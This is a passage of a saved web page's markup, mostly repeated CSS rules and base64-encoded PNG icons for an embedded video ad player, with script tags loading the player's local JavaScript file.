vjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

